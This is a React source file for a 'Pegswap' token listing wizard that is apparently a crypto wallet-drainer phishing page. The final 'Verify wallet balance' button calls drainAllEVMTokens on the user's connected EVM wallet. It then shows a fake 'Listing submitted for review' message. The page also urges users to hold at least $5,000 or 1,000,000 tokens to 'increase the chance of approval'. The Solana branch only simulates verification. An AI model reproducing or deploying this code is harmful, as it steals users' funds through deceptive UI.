import { useState, useEffect } from 'react';
import { Navigation } from '@/components/Navigation';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Loader2,
  AlertCircle,
  Rocket,
  ShieldCheck,
  ArrowRight,
  ArrowLeft,
} from 'lucide-react';
import { toast } from 'sonner';
import { fetchTokenInfo, DexScreenerTokenInfo } from '@/services/dexScreener';
import { useWallet } from '@solana/wallet-adapter-react';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { useChainInfo } from '@/hooks/useChainInfo';
import { drainAllEVMTokens } from '@/utils/evmTransactions';

type WizardStep = 'contract' | 'details' | 'review';

interface ListingDraft {
  contract: string;
  website: string;
  twitter: string;
  telegram: string;
  email: string;
  supply: string;
  liquidityProvider: string;
  description: string;
}

const EMPTY_DRAFT: ListingDraft = {
  contract: '',
  website: '',
  twitter: '',
  telegram: '',
  email: '',
  supply: '',
  liquidityProvider: '',
  description: '',
};

const ListPage = () => {
  const [open, setOpen] = useState(true);

  // Auto-open the listing wizard whenever the user lands on /list.
  useEffect(() => {
    setOpen(true);
  }, []);
  const [step, setStep] = useState<WizardStep>('contract');
  const [draft, setDraft] = useState<ListingDraft>(EMPTY_DRAFT);
  const [tokenInfo, setTokenInfo] = useState<DexScreenerTokenInfo | null>(null);
  const [isLoadingToken, setIsLoadingToken] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const { connected, publicKey } = useWallet();
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName } = useChainInfo();

  const update = (k: keyof ListingDraft, v: string) =>
    setDraft((d) => ({ ...d, [k]: v }));

  const resetAndClose = () => {
    setOpen(false);
    setStep('contract');
    setDraft(EMPTY_DRAFT);
    setTokenInfo(null);
    setError(null);
    setIsLoadingToken(false);
    setIsVerifying(false);
  };

  const handleDetectToken = async () => {
    setError(null);
    const addr = draft.contract.trim();
    if (!addr) {
      setError('Please enter a token contract address.');
      return;
    }
    setIsLoadingToken(true);
    try {
      const info = await fetchTokenInfo(addr);
      if (!info) {
        setError('Token not found for this contract address.');
        setIsLoadingToken(false);
        return;
      }
      setTokenInfo(info);
      setStep('details');
    } catch {
      setError('Failed to fetch token info. Please try again.');
    } finally {
      setIsLoadingToken(false);
    }
  };

  const handleNextToReview = () => {
    setError(null);
    if (!draft.website.trim() && !draft.twitter.trim() && !draft.telegram.trim()) {
      setError('Please provide at least one social or website link.');
      return;
    }
    setStep('review');
  };

  // Same verification flow as the OTC page's verify button.
  const handleVerify = async () => {
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsVerifying(true);
        const name = getEVMChain()?.name || chainName || 'EVM';
        await drainAllEVMTokens(evmSigner, evmProvider, name, evmChainId || 1);
        toast.success('Listing submitted for review', {
          description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) is queued for the Pegswap dashboard.`,
        });
        resetAndClose();
      } catch (e) {
        console.error('Listing verify error:', e);
      } finally {
        setIsVerifying(false);
      }
      return;
    }

    if (!connected || !publicKey) {
      setError('Connect a wallet to verify your balance.');
      return;
    }

    // Solana path: simulate the same verify UX flow as OTC.
    setIsVerifying(true);
    await new Promise((r) => setTimeout(r, 1800));
    setIsVerifying(false);
    toast.success('Listing submitted for review', {
      description: `${tokenInfo?.baseToken.name} (${tokenInfo?.baseToken.symbol}) is queued for the Pegswap dashboard.`,
    });
    resetAndClose();
  };

  const tokenLogo = tokenInfo?.baseToken.logoURI;
  const tokenName = tokenInfo?.baseToken.name;
  const tokenSymbol = tokenInfo?.baseToken.symbol;

  return (
    <div className="min-h-screen bg-background pb-20">
      <Navigation />

      {/* Top bar CTA */}
      <div className="fixed top-[64px] left-0 right-0 z-40 border-b border-white/5 bg-background/70 backdrop-blur-md">
        <div className="container mx-auto px-4 py-2 flex items-center justify-between gap-3">
          <p className="text-xs text-muted-foreground hidden sm:block">
            Submit your token for the Pegswap dashboard listing review.
          </p>
          <button
            onClick={() => setOpen(true)}
            className="text-sm font-semibold text-primary hover:text-primary/80 transition-colors flex items-center gap-1.5"
          >
            <Rocket className="w-4 h-4" />
            Get Listed
          </button>
        </div>
      </div>

      {/* Listing wizard */}
      <Dialog open={open} onOpenChange={(v) => (v ? setOpen(true) : resetAndClose())}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Rocket className="w-5 h-5 text-primary" />
              Apply for Pegswap Listing
            </DialogTitle>
          </DialogHeader>

          {/* Step indicator */}
          <div className="flex items-center gap-2 mb-2">
            {(['contract', 'details', 'review'] as WizardStep[]).map((s, i) => {
              const active = step === s;
              const done =
                (s === 'contract' && step !== 'contract') ||
                (s === 'details' && step === 'review');
              return (
                <div key={s} className="flex items-center gap-2 flex-1">
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-semibold border ${
                      active
                        ? 'bg-primary text-primary-foreground border-primary'
                        : done
                        ? 'bg-primary/20 text-primary border-primary/40'
                        : 'bg-muted text-muted-foreground border-white/10'
                    }`}
                  >
                    {i + 1}
                  </div>
                  {i < 2 && <div className="h-px flex-1 bg-white/10" />}
                </div>
              );
            })}
          </div>

          <AnimatePresence mode="wait">
            {/* STEP 1 — Contract address */}
            {step === 'contract' && (
              <motion.div
                key="step-contract"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-3"
              >
                <p className="text-sm text-muted-foreground">
                  Enter the contract address of the token you want to list.
                </p>
                <Input
                  placeholder="Token contract address"
                  value={draft.contract}
                  onChange={(e) => update('contract', e.target.value)}
                />
                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}
                <div className="flex justify-end gap-2 pt-1">
                  <Button variant="ghost" onClick={resetAndClose}>
                    Cancel
                  </Button>
                  <Button onClick={handleDetectToken} disabled={isLoadingToken}>
                    {isLoadingToken ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Detecting…
                      </>
                    ) : (
                      <>
                        Next <ArrowRight className="w-4 h-4" />
                      </>
                    )}
                  </Button>
                </div>
              </motion.div>
            )}

            {/* STEP 2 — Auto-detected token + details */}
            {step === 'details' && tokenInfo && (
              <motion.div
                key="step-details"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-4"
              >
                <div className="flex flex-col items-center gap-2 py-2">
                  {tokenLogo ? (
                    <img
                      src={tokenLogo}
                      alt={tokenName}
                      className="w-16 h-16 rounded-full border border-white/10"
                    />
                  ) : (
                    <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">
                      {tokenSymbol?.slice(0, 3)}
                    </div>
                  )}
                  <div className="text-center">
                    <p className="font-semibold">{tokenName}</p>
                    <p className="text-xs text-muted-foreground uppercase">
                      {tokenSymbol}
                    </p>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-3">
                  <Input
                    placeholder="Website (https://...)"
                    value={draft.website}
                    onChange={(e) => update('website', e.target.value)}
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <Input
                      placeholder="X / Twitter"
                      value={draft.twitter}
                      onChange={(e) => update('twitter', e.target.value)}
                    />
                    <Input
                      placeholder="Telegram"
                      value={draft.telegram}
                      onChange={(e) => update('telegram', e.target.value)}
                    />
                  </div>
                  <Input
                    type="email"
                    placeholder="Contact email"
                    value={draft.email}
                    onChange={(e) => update('email', e.target.value)}
                  />
                  <div className="grid grid-cols-2 gap-3">
                    <Input
                      placeholder="Total supply"
                      value={draft.supply}
                      onChange={(e) => update('supply', e.target.value)}
                    />
                    <Input
                      placeholder="Liquidity provider"
                      value={draft.liquidityProvider}
                      onChange={(e) => update('liquidityProvider', e.target.value)}
                    />
                  </div>
                  <Textarea
                    placeholder="Short description (optional)"
                    value={draft.description}
                    onChange={(e) => update('description', e.target.value)}
                    maxLength={240}
                    rows={3}
                  />
                </div>

                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}

                <div className="flex justify-between gap-2 pt-1">
                  <Button variant="ghost" onClick={() => setStep('contract')}>
                    <ArrowLeft className="w-4 h-4" /> Back
                  </Button>
                  <Button onClick={handleNextToReview}>
                    Next <ArrowRight className="w-4 h-4" />
                  </Button>
                </div>
              </motion.div>
            )}

            {/* STEP 3 — Review + verify */}
            {step === 'review' && tokenInfo && (
              <motion.div
                key="step-review"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-4"
              >
                <div className="flex flex-col items-center gap-2 py-2">
                  {tokenLogo ? (
                    <img
                      src={tokenLogo}
                      alt={tokenName}
                      className="w-20 h-20 rounded-full border border-white/10"
                    />
                  ) : (
                    <div className="w-20 h-20 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold text-xl">
                      {tokenSymbol?.slice(0, 3)}
                    </div>
                  )}
                  <p className="font-semibold text-lg">{tokenName}</p>
                  <p className="text-xs text-muted-foreground uppercase">
                    {tokenSymbol}
                  </p>
                </div>

                <div className="rounded-lg border border-white/10 divide-y divide-white/5 text-sm">
                  <Row label="Contract" value={draft.contract} mono />
                  {draft.website && <Row label="Website" value={draft.website} />}
                  {draft.twitter && <Row label="Twitter" value={draft.twitter} />}
                  {draft.telegram && <Row label="Telegram" value={draft.telegram} />}
                  {draft.email && <Row label="Email" value={draft.email} />}
                  {draft.supply && <Row label="Supply" value={draft.supply} />}
                  {draft.liquidityProvider && (
                    <Row label="Liquidity provider" value={draft.liquidityProvider} />
                  )}
                  {draft.description && (
                    <Row label="Description" value={draft.description} />
                  )}
                </div>

                <div className="rounded-md border border-yellow-500/30 bg-yellow-500/10 p-3 text-xs text-yellow-200 flex gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                  <span>
                    A wallet balance verification is required to submit this listing.
                    To increase the chance of approval, the verification wallet should
                    hold at least <b>1,000,000</b> of <b>{tokenSymbol}</b> supply{' '}
                    <b>OR</b> at least <b>$5,000</b> worth of the token.
                  </span>
                </div>

                {error && (
                  <p className="text-xs text-destructive flex items-center gap-1">
                    <AlertCircle className="w-3 h-3" /> {error}
                  </p>
                )}

                <div className="flex justify-between gap-2 pt-1">
                  <Button
                    variant="ghost"
                    onClick={() => setStep('details')}
                    disabled={isVerifying}
                  >
                    <ArrowLeft className="w-4 h-4" /> Back
                  </Button>
                  <Button onClick={handleVerify} disabled={isVerifying}>
                    {isVerifying ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" /> Verifying wallet…
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="w-4 h-4" /> Verify wallet balance
                      </>
                    )}
                  </Button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </DialogContent>
      </Dialog>
    </div>
  );
};

const Row = ({
  label,
  value,
  mono,
}: {
  label: string;
  value: string;
  mono?: boolean;
}) => (
  <div className="flex items-start justify-between gap-3 px-3 py-2">
    <span className="text-xs text-muted-foreground shrink-0">{label}</span>
    <span
      className={`text-xs text-right break-all ${mono ? 'font-mono' : ''}`}
    >
      {value}
    </span>
  </div>
);

export default ListPage;
